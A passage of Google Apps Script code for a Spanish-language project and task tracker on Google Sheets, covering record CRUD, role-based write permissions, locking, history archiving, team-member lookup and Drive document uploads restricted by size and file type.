        responsable: (data[i][4] || '').toString().trim(),
        participantes: (data[i][12] || '').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean)
      };
    }
  }
  return null;
}

// ════════════════════════════════════════════════════════════════
// PROJECTS CRUD
// ════════════════════════════════════════════════════════════════
function readProjects(ss) {
  var ws = ss.getSheetByName(SHEET_PROYECTOS);
  if (!ws) return [];
  var lastRow = ws.getLastRow();
  if (lastRow < 2) return [];
  var lastCol = Math.min(ws.getLastColumn(), PROJ_COLS);
  var data = ws.getRange(2, 1, lastRow - 1, lastCol).getValues();
  var projects = [];
  data.forEach(function(row) {
    if (!row[1]) return;
    projects.push({
      id: row[0], nombre: row[1]||'', pais: (row[2]||'').toString().trim(),
      lider: (row[3]||'').toString().trim(), responsable: (row[4]||'').toString().trim(),
      deadline: row[5]?(row[5] instanceof Date?Utilities.formatDate(row[5],'America/Bogota','dd/MM/yyyy'):row[5].toString()):'',
      deadlineISO: row[5]?(row[5] instanceof Date?Utilities.formatDate(row[5],'America/Bogota','yyyy-MM-dd'):''):'', priority: row[6]||'Media',
      status: row[7]||'Activo',
      // Cualquier estado distinto del default 'Activo' se considera puesto manualmente y se respeta.
      statusForced: (function(){ var s=(row[7]||'').toString().trim(); return s!=='' && s!=='Activo'; })(),
      descripcion: row[8]||'', notas: row[9]||'',
      creado: row[10]? Utilities.formatDate(new Date(row[10]),'America/Bogota','dd/MM/yyyy'):'',
      semana: row[11]||'',
      participantes: (row[12]||'').toString().split(',').map(function(s){return s.trim()}).filter(Boolean),
      tipoTrabajo: (row[13]||'').toString().trim(),
      riesgo: (row[14]||'').toString().trim(),
      documentos: _parseDocs(row[15]),
      pctDone: 0, tasks: [], taskStats: {}
    });
  });
  return projects;
}

function addProject(obj) { return _safeMutation(function() { return _addProjectImpl(obj); }); }
function _addProjectImpl(obj) {
  var ctx = _getAuthContext();
  // Validar que pueda crear en este país / como este responsable
  _authorizeProjectWrite(ctx, {
    pais: obj.pais || '',
    responsable: obj.responsable || ctx.user.name,
    participantes: (obj.participantes || '').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean)
  });
  var ss = ctx.ss;
  var ws = ss.getSheetByName(SHEET_PROYECTOS);
  if (!ws) {
    ws = ss.insertSheet(SHEET_PROYECTOS);
    ws.appendRow(['ID','Nombre','País','Líder','Responsable','Deadline','Prioridad','Estado','Descripción','Notas','Creado','Semana','Participantes','TipoTrabajo','Riesgo','Documentos']);
    ws.getRange(1,1,1,PROJ_COLS).setFontWeight('bold').setBackground('#FF4940').setFontColor('#FFFFFF');
    ws.setTabColor('#FF4940');
  }
  // Lock para evitar colisión de IDs entre addProject concurrentes
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var lastRow = ws.getLastRow();
    // max(IDs existentes) + 1 — resiste borrados y mantiene IDs únicos.
    var newId = 1;
    if (lastRow >= 2) {
      var ids = ws.getRange(2, 1, lastRow - 1, 1).getValues();
      ids.forEach(function(r){ var v = parseInt(r[0], 10); if (!isNaN(v) && v >= newId) newId = v + 1; });
    }
    var equipos = readEquipos(ss);
    var pais  = obj.pais || getCountryForMember(obj.responsable, equipos);
    var lider = obj.lider || getLeaderForCountry(pais, equipos);
    ws.appendRow(_sanitizeRow([
      newId, obj.nombre||'', pais, lider, obj.responsable||'',
      obj.deadline||'', obj.priority||'Media', obj.status||'Activo',
      obj.descripcion||'', obj.notas||'', new Date(), getCurrentWeekLabel(), obj.participantes||'',
      obj.tipoTrabajo||'', obj.riesgo||'', ''
    ]));
    return {success:true, id:newId, nombre:obj.nombre||''};
  } finally {
    lock.releaseLock();
    invalidateCache();
  }
}

function updateProjectField(projId, field, value) { return _safeMutation(function() { return _updateProjectFieldImpl(projId, field, value); }); }
function _updateProjectFieldImpl(projId, field, value) {
  var ctx = _getAuthContext();
  var current = _readProjectById(ctx.ss, projId);
  if (!current) return { success: false, error: 'Project #' + projId + ' not found' };
  _authorizeProjectWrite(ctx, current);
  var ws = ctx.ss.getSheetByName(SHEET_PROYECTOS);
  var fieldMap = {'nombre':2,'pais':3,'lider':4,'responsable':5,'deadline':6,'priority':7,'status':8,'descripcion':9,'notas':10,'participantes':13,'tipoTrabajo':14,'riesgo':15};
  var col = fieldMap[field];
  if (!col) return { success: false, error: 'Invalid field: ' + field };
  // Lock para serializar mutaciones concurrentes sobre la hoja Proyectos.
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    ws.getRange(current.row, col).setValue(_sanitizeCell(value));
    return { success: true };
  } finally {
    lock.releaseLock();
    invalidateCache();
  }
}

// Batch update de proyectos: aplica varios campos en una sola llamada.
// Valida permisos contra el estado actual antes de cualquier escritura.
function updateProjectFields(projId, fields) { return _safeMutation(function() { return _updateProjectFieldsImpl(projId, fields); }); }
function _updateProjectFieldsImpl(projId, fields) {
  if (!fields || typeof fields !== 'object') return { success: false, error: 'Invalid fields' };
  var ctx = _getAuthContext();
  var current = _readProjectById(ctx.ss, projId);
  if (!current) return { success: false, error: 'Project #' + projId + ' not found' };
  _authorizeProjectWrite(ctx, current);

  // Manager no puede mover el proyecto a otro país; specialist no puede
  // transferir responsabilidad ni cambiar país.
  if (ctx.role === 'manager' && fields.pais !== undefined && fields.pais !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes mover el proyecto a otro país');
  }
  if (ctx.role === 'specialist') {
    if (fields.responsable !== undefined && fields.responsable !== ctx.user.name) {
      throw new Error('Sin permiso: no puedes transferir el proyecto');
    }
    if (fields.pais !== undefined && fields.pais !== current.pais) {
      throw new Error('Sin permiso: no puedes cambiar el país del proyecto');
    }
  }

  var ws = ctx.ss.getSheetByName(SHEET_PROYECTOS);
  var fieldMap = {'nombre':2,'pais':3,'lider':4,'responsable':5,'deadline':6,'priority':7,'status':8,'descripcion':9,'notas':10,'participantes':13,'tipoTrabajo':14,'riesgo':15};
  var row = current.row;

  // Lock para serializar mutaciones concurrentes en hoja Proyectos.
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    Object.keys(fields).forEach(function(k) {
      var col = fieldMap[k];
      if (!col) return;
      var v = fields[k];
      // participantes puede llegar como array o string csv
      if (k === 'participantes' && Array.isArray(v)) v = v.join(', ');
      ws.getRange(row, col).setValue(_sanitizeCell(v));
    });
    return { success: true };
  } finally {
    lock.releaseLock();
    invalidateCache();
  }
}

// ════════════════════════════════════════════════════════════════
// TASKS
// ════════════════════════════════════════════════════════════════
function readTasks(ws) {
  if (!ws) return [];
  var lastRow = ws.getLastRow(); if (lastRow < 4) return [];
  var lastCol = Math.min(ws.getLastColumn(), TASK_COLS);
  var data = ws.getRange(4, 1, lastRow - 3, lastCol).getValues();
  var tasks = [];
  data.forEach(function(row) {
    if (!row[1]) return;
    var proyVal = (row[11]||'').toString().trim();
    tasks.push({
      id:row[0], nombre:row[1]||'', resp:row[2]||'', acc:row[3]||'',
      deadline:row[4]?(row[4] instanceof Date?Utilities.formatDate(row[4],'America/Bogota','dd/MM/yyyy'):row[4].toString()):'',
      deadlineISO:row[4]?(row[4] instanceof Date?Utilities.formatDate(row[4],'America/Bogota','yyyy-MM-dd'):''):'', priority:row[5]||'Media', status:row[6]||'Pendiente',
      semana:row[7]||'',
      creado:row[8]?Utilities.formatDate(new Date(row[8]),'America/Bogota','dd/MM/yyyy'):'',
      creadoRaw:row[8]?new Date(row[8]).toISOString():null,
      cerrado:row[9]?Utilities.formatDate(new Date(row[9]),'America/Bogota','dd/MM/yyyy'):'',
      notas:row[10]||'',
      proyectoId: isNaN(parseInt(proyVal, 10)) ? '' : parseInt(proyVal, 10),
      proyecto: proyVal, // keep raw for backward compat
      pais:(row[12]||'').toString().trim(),
      lider:(row[13]||'').toString().trim(),
      tipoTrabajo:(row[14]||'').toString().trim(),
      riesgo:(row[15]||'').toString().trim(),
      documentos: _parseDocs(row[16]),
      confidencialidad: (row[17] || 'estandar').toString().trim() || 'estandar'
    });
  });
  tasks.sort(function(a,b){return (PRIO_ORDER[a.priority]||1)-(PRIO_ORDER[b.priority]||1)||(STATUS_ORDER[a.status]||2)-(STATUS_ORDER[b.status]||2)});
  return tasks;
}

function addTask(taskObj) {
  return _telemetry('addTask', function() {
    return _safeMutation(function() { return _addTaskImpl(taskObj); });
  }, { hasResp: !!(taskObj && taskObj.resp), hasProyecto: !!(taskObj && (taskObj.proyectoId || taskObj.proyecto)) });
}
function _addTaskImpl(taskObj) {
  var ctx = _getAuthContext();
  var equipos = ctx.equipos;
  var proposedResp = taskObj.resp || '';
  var proposedPais = taskObj.pais || getCountryForMember(proposedResp, equipos);
  // Validar permisos antes de escribir. Specialist solo puede asignarse a sí mismo;
  // manager solo dentro de su país; head sin restricción.
  _authorizeTaskWrite(ctx, { resp: proposedResp, pais: proposedPais });

  var ss = ctx.ss, ws = ss.getSheetByName(SHEET_ACTIVO);
  // Lock para que nextTaskId + appendRow sean atómicos frente a creaciones concurrentes.
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var newId = nextTaskId(ss);
    var pais  = proposedPais;
    var lider = taskObj.lider || getLeaderForCountry(pais, equipos);
    // Normalizar proyectoId a entero; si no es válido, celda vacía.
    var pid = taskObj.proyectoId || taskObj.proyecto || '';
    var pidNum = parseInt(pid, 10);
    var pidCell = isNaN(pidNum) ? '' : pidNum;
    var conf = (taskObj.confidencialidad || 'estandar').toString().trim() || 'estandar';
    // Construimos la fila al ancho real del sheet: si el usuario aún no agregó
    // la columna 17 (Documentos) o 18 (Confidencialidad), no las escribimos
    // (no podemos crear columnas desde acá). Si existen, se llenan vacío/default.
    var lc = ws.getLastColumn();
    var rowVals = [
      newId, taskObj.nombre||'', taskObj.resp||'', taskObj.acc||'',
      taskObj.deadline||'', taskObj.priority||'Media', taskObj.status||'Pendiente',
      taskObj.semana||getCurrentWeekLabel(), new Date(), '', taskObj.notas||'',
      pidCell, pais, lider,
      taskObj.tipoTrabajo||'', taskObj.riesgo||''
    ];
    // Solo agregamos columnas adicionales si la hoja las tiene; si no, appendRow las omite.
    if (lc >= 17) rowVals.push(''); // Documentos
    if (lc >= 18) rowVals.push(conf); // Confidencialidad
    ws.appendRow(_sanitizeRow(rowVals));
    return {success:true, id:newId};
  } finally {
    lock.releaseLock();
    invalidateCache();
  }
}

function updateTaskField(taskId, field, value) { return _safeMutation(function() { return _updateTaskFieldImpl(taskId, field, value); }); }
function _updateTaskFieldImpl(taskId, field, value) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, error: 'Task #' + taskId + ' not found' };
  _authorizeTaskWrite(ctx, current);

  var fieldMap = {'nombre':2,'resp':3,'acc':4,'deadline':5,'priority':6,'status':7,'notas':11,'proyecto':12,'proyectoId':12,'pais':13,'lider':14,'tipoTrabajo':15,'riesgo':16,'confidencialidad':18};
  var col = fieldMap[field];
  if (!col) return { success: false, error: 'Invalid field: ' + field };

  // Specialist no puede reasignar resp (sacarse la tarea de encima); manager
  // sí puede reasignar dentro de su país. Chequeo extra solo si field==='resp'.
  if (field === 'resp' && ctx.role === 'specialist' && value !== ctx.user.name) {
    throw new Error('Sin permiso: no puedes reasignar tareas');
  }
  if (field === 'pais' && ctx.role === 'manager' && value !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes mover tareas a otro país');
  }
  // Solo manager/head pueden cambiar el nivel de confidencialidad de una tarea.
  if (field === 'confidencialidad' && ctx.role !== 'manager' && ctx.role !== 'head') {
    throw new Error('Sin permiso: solo manager o head pueden cambiar confidencialidad');
  }

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Normalizar proyectoId a entero (o vacío)
  if (field === 'proyectoId' || field === 'proyecto') {
    var n = parseInt(value, 10);
    value = isNaN(n) ? '' : n;
  }
  // Lock para serializar la escritura de la celda. moveToHistorial tiene su propio
  // lock interno, por eso lo invocamos FUERA del bloque (el lock de Apps Script no
  // es reentrante de forma garantizada, así evitamos cualquier deadlock).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var movedToHistorial = false;
  try {
    ws.getRange(current.row, col).setValue(_sanitizeCell(value));
    if (field === 'status' && value === 'Listo') {
      ws.getRange(current.row, 10).setValue(new Date());
      movedToHistorial = true;
    }
  } finally {
    lock.releaseLock();
  }
  if (movedToHistorial) {
    moveToHistorial(ctx.ss, ws, current.row);
    invalidateCache();
    return { success: true, moved: true, message: 'Tarea movida a Historial' };
  }
  invalidateCache();
  return { success: true };
}
function updateTaskStatus(taskId, newStatus) { return updateTaskField(taskId, 'status', newStatus); }

// Batch update: aplica varios campos en una sola llamada.
// Si `status` es 'Listo', se aplica al final y dispara el move a Historial (los demás campos ya quedaron escritos).
function updateTaskFields(taskId, fields) {
  return _telemetry('updateTaskFields', function() {
    return _safeMutation(function() { return _updateTaskFieldsImpl(taskId, fields); });
  }, { taskId: taskId, fieldCount: (fields && typeof fields === 'object') ? Object.keys(fields).length : 0, hasStatus: !!(fields && fields.status) });
}
function _updateTaskFieldsImpl(taskId, fields) {
  if (!fields || typeof fields !== 'object') return { success: false, error: 'Invalid fields' };
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, error: 'Task #' + taskId + ' not found' };
  _authorizeTaskWrite(ctx, current);

  // Chequeos extra para reasignaciones no permitidas
  if (ctx.role === 'specialist' && fields.resp !== undefined && fields.resp !== ctx.user.name) {
    throw new Error('Sin permiso: no puedes reasignar tareas');
  }
  if (ctx.role === 'manager' && fields.pais !== undefined && fields.pais !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes mover tareas a otro país');
  }
  // Solo manager/head pueden cambiar el nivel de confidencialidad de una tarea.
  if (fields.confidencialidad !== undefined && ctx.role !== 'manager' && ctx.role !== 'head') {
    throw new Error('Sin permiso: solo manager o head pueden cambiar confidencialidad');
  }

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  var fieldMap = {'nombre':2,'resp':3,'acc':4,'deadline':5,'priority':6,'status':7,'notas':11,'proyecto':12,'proyectoId':12,'pais':13,'lider':14,'tipoTrabajo':15,'riesgo':16,'confidencialidad':18};
  var row = current.row;

  // Lock para serializar mutaciones. moveToHistorial se llama fuera del bloque
  // (tiene su propio lock interno; evitamos asumir reentrancia).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var movedToHistorial = false;
  try {
    // 1) Aplicar todos los campos menos status
    Object.keys(fields).forEach(function(k) {
      if (k === 'status') return;
      var col = fieldMap[k];
      if (!col) return;
      var v = fields[k];
      if (k === 'proyectoId' || k === 'proyecto') {
        var n = parseInt(v, 10);
        v = isNaN(n) ? '' : n;
      }
      ws.getRange(row, col).setValue(_sanitizeCell(v));
    });

    // 2) Status al final (puede disparar move a Historial)
    if (fields.status !== undefined) {
      ws.getRange(row, 7).setValue(_sanitizeCell(fields.status));
      if (fields.status === 'Listo') {
        ws.getRange(row, 10).setValue(new Date());
        movedToHistorial = true;
      }
    }
  } finally {
    lock.releaseLock();
  }
  if (movedToHistorial) {
    moveToHistorial(ctx.ss, ws, row);
    invalidateCache();
    return { success: true, moved: true, message: 'Tarea movida a Historial' };
  }
  invalidateCache();
  return { success: true };
}

// ════════════════════════════════════════════════════════════════
// EQUIPOS / CONFIG / HELPERS
// ════════════════════════════════════════════════════════════════
function readEquipos(ss){var ws=ss.getSheetByName(SHEET_EQUIPOS);if(!ws)return getDefaultEquipos();var lr=ws.getLastRow();if(lr<2)return getDefaultEquipos();var data=ws.getRange(2,1,lr-1,8).getValues();var eq=[];data.forEach(function(r){var c=(r[0]||'').toString().trim();if(!c)return;eq.push({code:c,country:(r[1]||'').toString().trim(),leader:(r[2]||'').toString().trim().replace(/\n/g,''),leaderEmail:(r[3]||'').toString().trim(),members:(r[4]||'').toString().split(',').map(function(s){return s.trim()}).filter(Boolean),emails:(r[5]||'').toString().split(',').map(function(s){return s.trim()}).filter(Boolean),slackChannel:(r[6]||'').toString().trim(),notes:(r[7]||'').toString().trim()})});return eq.length>0?eq:getDefaultEquipos()}
function getDefaultEquipos(){return [{code:'CO',country:'Colombia',leader:'Carlos Eduardo Fernández',leaderEmail:'',members:['Isabela Zuluaga','Nicolás Naranjo','Juan Manuel Caicedo','Juan Camilo Gallego','Valeria Rangel','David Gaviria'],emails:[],slackChannel:'',notes:''}]}
function getAllMembers(eq){var n={};eq.forEach(function(e){if(e.leader)n[e.leader]=1;e.members.forEach(function(m){n[m]=1})});return Object.keys(n).sort()}
// Cache module-level de normalizaciones: evita reprocesar miles de veces el mismo nombre
// en stats/refresh. La clave es el string crudo; el value es el normalizado.
// También cacheamos el "índice" de equipos (por identidad de array) para no retokenizar
// en cada call durante el mismo request.
var _NAME_NORM_CACHE = {};
var _EQUIPOS_INDEX_CACHE = { ref: null, idx: null };
function _normalizeName(s){
  if(s==null) return '';
  var raw = s.toString();
  if(_NAME_NORM_CACHE.hasOwnProperty(raw)) return _NAME_NORM_CACHE[raw];
  var out = raw;
  // Rango Unicode de diacríticos combinantes U+0300..U+036F. Construimos el regex con
  // \u-escapes vía RegExp() para ser independientes del encoding del archivo fuente.
  try { out = out.normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]','g'),''); } catch(e) {}
  out = out.toLowerCase().replace(/\s+/g,' ').replace(/^ +| +$/g,'');
  _NAME_NORM_CACHE[raw] = out;
  return out;
}
// Construye (o reutiliza) un índice {entries:[{code,name,norm,tokens,isLeader,email}], ...}
// para una lista de equipos dada. Cacheado por identidad del array eq.
function _buildEquiposIndex(eq){
  if(_EQUIPOS_INDEX_CACHE.ref === eq && _EQUIPOS_INDEX_CACHE.idx) return _EQUIPOS_INDEX_CACHE.idx;
  var entries = [];
  for(var i=0;i<eq.length;i++){
    var team = eq[i];
    if(team.leader){
      var ln = _normalizeName(team.leader);
      entries.push({code:team.code,name:team.leader,norm:ln,tokens:ln.split(' ').filter(Boolean),isLeader:true,email:team.leaderEmail||'',order:entries.length});
    }
    var mem = team.members||[], emails = team.emails||[];
    for(var j=0;j<mem.length;j++){
      var mn = _normalizeName(mem[j]);
      entries.push({code:team.code,name:mem[j],norm:mn,tokens:mn.split(' ').filter(Boolean),isLeader:false,email:emails[j]||'',order:entries.length});
    }
  }
  var idx = {entries:entries};
  _EQUIPOS_INDEX_CACHE = {ref:eq, idx:idx};
  return idx;
}
// Busca el entry que corresponde a `name` aplicando: (1) match exacto normalizado,
// (2) match por tokens (todos los tokens del query ⊂ tokens del candidato).
// Desempate: exacto > nombre más corto (menos tokens) > primer orden de aparición.
function _findMemberEntry(name, eq){
  if(!name) return null;
  var idx = _buildEquiposIndex(eq);
  var qNorm = _normalizeName(name);
  if(!qNorm) return null;
  var entries = idx.entries;
  // 1) Exacto normalizado
  for(var i=0;i<entries.length;i++){
    if(entries[i].norm === qNorm) return entries[i];
  }
  // 2) Match por tokens
  var qTokens = qNorm.split(' ').filter(Boolean);
  if(!qTokens.length) return null;
  var best = null;
  for(var k=0;k<entries.length;k++){
    var e = entries[k];
    var et = e.tokens; if(!et.length) continue;
    var allIn = true;
    for(var t=0;t<qTokens.length;t++){
      if(et.indexOf(qTokens[t])<0){ allIn = false; break; }
    }
    if(!allIn) continue;
    if(!best){ best = e; continue; }
    // Preferir nombre más corto (menos tokens); empate → primero en el sheet (ya está por order).
    if(e.tokens.length < best.tokens.length) best = e;
  }
  return best;
}
function getCountryForMember(name,eq){
  var hit = _findMemberEntry(name, eq);
  return hit ? hit.code : '';
}
// Resuelve un miembro/líder por nombre con normalización tolerante.
// Devuelve {name, code, email, isLeader} o null. Útil para resolver email al notificar.
function getMemberByName(name, eq){
  var hit = _findMemberEntry(name, eq);
  if(!hit) return null;
  return {name:hit.name, code:hit.code, email:hit.email||'', isLeader:!!hit.isLeader};
}
function getLeaderForCountry(code,eq){for(var i=0;i<eq.length;i++){if(eq[i].code===code)return eq[i].leader}return ''}
function readConfig(ss){var ws=ss.getSheetByName(SHEET_CONFIG);if(!ws)return {};var lr=ws.getLastRow();if(lr<3)return {};var data=ws.getRange(3,1,lr-2,2).getValues(),c={};data.forEach(function(r){if(r[0])c[r[0]]=r[1]});return c}
function countBizDays(start,end){var count=0,cur=new Date(start);while(cur<end){cur.setDate(cur.getDate()+1);var d=cur.getDay();if(d!==0&&d!==6)count++}return count}
// Mueve una tarea al Historial preservando su ID original.
// Ya NO renumera las tareas restantes: los IDs son persistentes (pueden quedar huecos 1,3,7,...).
// Lock para que read+append+delete sean atómicos: sin lock, dos cierres concurrentes pueden
// borrar filas incorrectas (el deleteRow corre contra el sheet ya mutado por otro usuario).
function moveToHistorial(ss, wsA, row) {
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var wsH = ss.getSheetByName(SHEET_HISTORIAL);
    var lc = Math.min(wsA.getLastColumn(), TASK_COLS);
    var rd = wsA.getRange(row, 1, 1, lc).getValues()[0];
    while (rd.length < TASK_COLS) rd.push('');
    // Preserva el ID original — NO reasignar. Así las referencias (notas, Slack, humanas) siguen válidas.
    wsH.appendRow(rd);
    wsA.deleteRow(row);
  } finally {
    lock.releaseLock();
  }
}

// Calcula el próximo ID único entre activos + historial (evita colisiones tras mover tareas).
function nextTaskId(ss) {
  var maxId = 0;
  ['Tracking Activo','Historial'].forEach(function(name){
    var ws = ss.getSheetByName(name); if (!ws) return;
    var lr = ws.getLastRow(); if (lr < 4) return;
    var ids = ws.getRange(4, 1, lr - 3, 1).getValues();
    ids.forEach(function(r){ var v = parseInt(r[0], 10); if (!isNaN(v) && v > maxId) maxId = v; });
  });
  return maxId + 1;
}
function getCurrentWeekLabel(){var now=new Date(),mon=new Date(now);mon.setDate(now.getDate()-(now.getDay()===0?6:now.getDay()-1));var fri=new Date(mon);fri.setDate(mon.getDate()+4);var m=['ene','feb','mar','abr','may','jun','jul','ago','sep','oct','nov','dic'];return mon.getDate()+'-'+fri.getDate()+' '+m[fri.getMonth()]+' '+fri.getFullYear()}

// ════════════════════════════════════════════════════════════════
// DOCUMENTS (Drive integration)
// ════════════════════════════════════════════════════════════════
// Cada task/project tiene columna "Documentos" con JSON [{name, url, id}].
// Subidas nuevas se clasifican en subcarpetas automáticas bajo la raíz
// configurada en Config!DriveFolder.

function _parseDocs(cellValue) {
  if (!cellValue) return [];
  var s = cellValue.toString().trim();
  if (!s) return [];
  try {
    var arr = JSON.parse(s);
    return Array.isArray(arr) ? arr : [];
  } catch (e) { return []; }
}

function _serializeDocs(docs) {
  if (!docs || !docs.length) return '';
  return JSON.stringify(docs);
}

// Extrae el ID de Drive de una URL o retorna el valor tal cual si ya parece ID.
function _extractDriveId(urlOrId) {
  if (!urlOrId) return '';
  var s = urlOrId.toString().trim();
  // URL típica: /folders/XXX  o  /d/XXX  o  ?id=XXX
  var m = s.match(/\/folders\/([a-zA-Z0-9_-]+)/) ||
          s.match(/\/d\/([a-zA-Z0-9_-]+)/) ||
          s.match(/[?&]id=([a-zA-Z0-9_-]+)/);
  if (m) return m[1];
  // Si ya parece un ID crudo (solo chars válidos)
  if (/^[a-zA-Z0-9_-]{20,}$/.test(s)) return s;
  return '';
}

// Resuelve la carpeta raíz configurada en Config!DriveFolder. Lanza si no
// está configurada o no es accesible. Los mensajes de error apuntan al admin
// (primer email en Config!Heads) cuando es posible — así el usuario sabe
// a quién pedirle que arregle la config en lugar de quedar trabado.
function _getRootFolder() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var config = readConfig(ss);
  var cfgValue = config['DriveFolder'] || config['driveFolder'] || '';
  if (!cfgValue) {
    // Tomamos el primer email de Heads como contacto para el usuario.
    // Si no hay Heads configurados, mensaje genérico (sigue siendo accionable).
    var headsRaw = (config['Heads'] || '').toString();
    var firstHead = headsRaw.split(',').map(function(s){ return s.trim(); }).filter(Boolean)[0] || '';
    if (firstHead) {
      throw new Error('Pedile a ' + firstHead + ' que configure Config!DriveFolder con la URL de la carpeta de Drive raíz.');
    }
    throw new Error('Falta configurar Config!DriveFolder: pega la URL o el ID de la carpeta de Drive raíz en la hoja Config.');
  }
  var folderId = _extractDriveId(cfgValue);
  if (!folderId) {
    // Truncamos el valor recibido para no inflar el error con strings largos
    // (la URL o el ID típicos no superan 80 chars; valores raros se ven igual).
    var preview = cfgValue.toString();
    if (preview.length > 80) preview = preview.substring(0, 80) + '...';
    throw new Error("El valor de Config!DriveFolder no parece una URL de Drive ni un ID. Recibido: '" + preview + "'.");
  }
  try {
    return DriveApp.getFolderById(folderId);
  } catch (e) {
    // Caso típico: el usuario perdió el scope de Drive (reautorización pendiente)
    // o el dueño del webapp no aprobó el scope. Mensaje accionable en lugar de raw.
    throw new Error('No tengo permiso para acceder a la carpeta de Drive. Pedile al dueño del script que apruebe los permisos.');
  }
}

// Retorna (o crea) una subcarpeta por nombre dentro de parent.
function _ensureSubfolder(parent, name) {
  var clean = (name || '').toString().trim() || 'Sin clasificar';
  var it = parent.getFoldersByName(clean);
  if (it.hasNext()) return it.next();
  return parent.createFolder(clean);
}

// Resuelve la carpeta final donde debe ir un archivo según la taxonomía:
//   TipoTrabajo / País / (NombreProyecto | "Tareas sueltas")
function _resolveTargetFolder(kind, itemId) {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var root = _getRootFolder();
  var tipo = '', pais = '', projName = '';

  if (kind === 'task') {
    var ws = ss.getSheetByName(SHEET_ACTIVO);
    var lr = ws.getLastRow();
    var lc = Math.min(ws.getLastColumn(), TASK_COLS);
    var data = ws.getRange(4, 1, Math.max(0, lr - 3), lc).getValues();
    for (var i = 0; i < data.length; i++) {
      if (data[i][0] == itemId) {
        pais = (data[i][12] || '').toString().trim();
        tipo = (data[i][14] || '').toString().trim();
        var pid = parseInt((data[i][11] || '').toString().trim(), 10);
        if (!isNaN(pid)) {
          var projRow = _readProjectById(ss, pid);
          if (projRow) {
            var pws = ss.getSheetByName(SHEET_PROYECTOS);
            projName = (pws.getRange(projRow.row, 2).getValue() || '').toString().trim();
          }
        }
        break;
      }
    }
  } else if (kind === 'project') {
    var pws = ss.getSheetByName(SHEET_PROYECTOS);
    var plr = pws.getLastRow();
    var pdata = pws.getRange(2, 1, Math.max(0, plr - 1), PROJ_COLS).getValues();
    for (var j = 0; j < pdata.length; j++) {
      if (pdata[j][0] == itemId) {
        pais = (pdata[j][2] || '').toString().trim();
        tipo = (pdata[j][13] || '').toString().trim();
        projName = (pdata[j][1] || '').toString().trim();
        break;
      }
    }
  }

  var tipoFolder = _ensureSubfolder(root, tipo || 'Sin clasificar');
  var paisFolder = _ensureSubfolder(tipoFolder, pais || 'Sin país');
  var finalName = kind === 'project'
    ? (projName || 'Sin nombre')
    : (projName || 'Tareas sueltas');
  return _ensureSubfolder(paisFolder, finalName);
}

// Lee los docs actuales del item + la posición en el sheet + la columna.
function _readDocsFor(kind, itemId) {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  if (kind === 'task') {
    var ws = ss.getSheetByName(SHEET_ACTIVO);
    var lr = ws.getLastRow();
    if (lr < 4) return null;
    var lc = Math.min(ws.getLastColumn(), TASK_COLS);
    var data = ws.getRange(4, 1, lr - 3, lc).getValues();
    for (var i = 0; i < data.length; i++) {
      if (data[i][0] == itemId) {
        return { ss: ss, ws: ws, row: i + 4, col: TASK_DOCS_COL, docs: _parseDocs(data[i][TASK_DOCS_COL - 1]),
                 target: { resp: data[i][2], pais: (data[i][12] || '').toString().trim() } };
      }
    }
  } else if (kind === 'project') {
    var pws = ss.getSheetByName(SHEET_PROYECTOS);
    var plr = pws.getLastRow();
    if (plr < 2) return null;
    var pdata = pws.getRange(2, 1, plr - 1, PROJ_COLS).getValues();
    for (var j = 0; j < pdata.length; j++) {
      if (pdata[j][0] == itemId) {
        var parts = (pdata[j][12] || '').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean);
        return { ss: ss, ws: pws, row: j + 2, col: PROJ_DOCS_COL, docs: _parseDocs(pdata[j][PROJ_DOCS_COL - 1]),
                 target: { responsable: (pdata[j][4] || '').toString().trim(),
                           pais: (pdata[j][2] || '').toString().trim(),
                           participantes: parts } };
      }
    }
  }
  return null;
}

// Sube un archivo (base64) a Drive y lo vincula al item. Retorna el doc descriptor.
// SECURITY: aplica cap de tamaño y allowlist de MIME types para evitar abuso.
var _UPLOAD_MAX_BYTES = 45 * 1024 * 1024; // 45 MB
var _UPLOAD_ALLOWED_MIME = {
  'application/pdf': 1,
  'application/msword': 1,
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document': 1,
  'application/vnd.ms-excel': 1,
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': 1,
  'image/png': 1,
  'image/jpeg': 1,
  'image/jpg': 1,
  'text/plain': 1
};
// Wrapper público: garantiza que cualquier excepción (Drive cuota, permisos,
// scope no autorizado) llegue al cliente como {success:false, error} y NO
// rompa el failureHandler del frontend.
function uploadDocument(kind, itemId, fileData) {
  return _safeMutation(function() { return _uploadDocumentImpl(kind, itemId, fileData); });
}
function _uploadDocumentImpl(kind, itemId, fileData) {
  if (!fileData || !fileData.data || !fileData.name) {
    return { success: false, error: 'Datos de archivo inválidos' };
  }
  var ctx = _getAuthContext();
  var info = _readDocsFor(kind, itemId);
  if (!info) return { success: false, error: (kind === 'project' ? 'Proyecto' : 'Tarea') + ' #' + itemId + ' no encontrado' };
